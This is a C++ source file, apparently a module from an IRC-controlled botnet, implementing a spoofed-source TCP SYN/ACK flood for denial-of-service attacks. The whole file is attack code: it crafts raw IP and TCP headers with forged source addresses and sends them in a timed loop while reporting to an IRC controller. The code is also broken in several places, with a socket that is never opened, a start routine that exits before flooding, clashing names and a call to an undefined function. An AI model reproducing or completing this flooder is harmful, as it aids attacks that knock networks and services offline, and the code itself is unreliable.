/*

MADE BY DiablO kroutoyy@hotmail.com
HARD ACK,SYN FLOOD. not finished yet.

*/

#include "main.h"
#include "mainctrl.h"
#include "utility.h"

typedef struct PACKET {
	SOCKET sock;
	int threadnum;
	char ip[128];
	int port;
	int length;
	char type[128];

} PACKET;

long PACKET(char *target, char *port, char *type, char *len);

CDDOSPACKET::CDDOSPACKET() { m_szType="CDDOSPACKET"; m_sDDOSName.Assign("packetflood"); }


	void CDDOSPACKET::StartDDOS(){
    
    g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "[%s] Packeting %s:%u whit %s for  [%u second]", m_sDDOSName.CStr(), m_sHost.CStr(), m_iPort, m_sType.CStr(), m_iPort,m_iTime);  
    PACKET packet;
	strcpy(packet.ip,m_sHost.CStr());
	strcpy(packet.type,m_sType.CStr());
	packet.port = m_iPort;
	packet.length = m_iTime;

	srand(GetTickCount());
	ExitThread(0);
}

long SendPACKETz(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort, int len)
{  
	SOCKET sock;
	WSADATA WSAData;  
	SOCKADDR_IN addr_in; 
	IPHEADER ipHeader; 
	TCPHEADER tcpHeader; 
	PSDHEADER psdHeader; 
 
	LARGE_INTEGER freq, halt_time, cur;
	char szSendBuf[60]={0},buf[64]; 
	int rect;

	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons((unsigned short)TargetPort);
	addr_in.sin_addr.s_addr=TargetIP;

	ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP;
	ipHeader.checksum=0;
	ipHeader.destIP=TargetIP;

	tcpHeader.th_dport=htons((unsigned short)TargetPort);
	tcpHeader.th_sport=htons((unsigned short)rand()%1025);
	tcpHeader.th_seq=htonl(0x12345678);

	if (strcmp(Type,"syn") == 0) {
		tcpHeader.th_seq=0;
		tcpHeader.th_flag=SYN;
	} else if (strcmp(Type,"ack") == 0) {
		tcpHeader.th_ack=0;
		tcpHeader.th_flag=ACK;
	} else if (strcmp(Type,"random") == 0) {
		tcpHeader.th_seq=rand()%3;
		if (rand()%2 == 0) 
			tcpHeader.th_flag=SYN;
		else 
			tcpHeader.th_flag=ACK;
	}
	
	tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
	tcpHeader.th_win=htons(16384); 
	tcpHeader.th_urp=0; 

	long total = 0;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&cur);
	halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
	while (1) {
		tcpHeader.th_sum=0; 
		tcpHeader.th_sport=htons((unsigned short)((rand() % 1001) + 1000));
		tcpHeader.th_seq=htons((unsigned short)((rand() << 16) | rand()));

		ipHeader.sourceIP=htonl(SpoofingIP++); 

		psdHeader.daddr=ipHeader.destIP; 
		psdHeader.mbz=0; 
		psdHeader.ptcl=IPPROTO_TCP; 
		psdHeader.tcpl=htons(sizeof(tcpHeader));
		psdHeader.saddr=ipHeader.sourceIP; 
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));
		
		tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&addr_in, sizeof(addr_in));
		if (rect==SOCKET_ERROR) {
			closesocket(sock);
			WSACleanup();
			return 0;
		}
     
		total += rect;
		QueryPerformanceCounter(&cur);
		if (cur.QuadPart >= halt_time.QuadPart)
			break;
	}

	closesocket(sock); 
	WSACleanup(); 
 
	return (total);
}

long SendPACKETz(char *target, char *port, char *type, char *len)
{
	CDNS cDNS;
	unsigned long TargetIP = cDNS.ResolveAddress(target);
	unsigned short p = atoi(port);
	int t = atoi(len);
	unsigned int SpoofIP = TargetIP + ((rand()%512)+256);

	long num = SendPacket(TargetIP, SpoofIP, type, p, t);

	if (num == 0) 
		num = 1;  
	num = num / 1000 / t;

	return num;
}
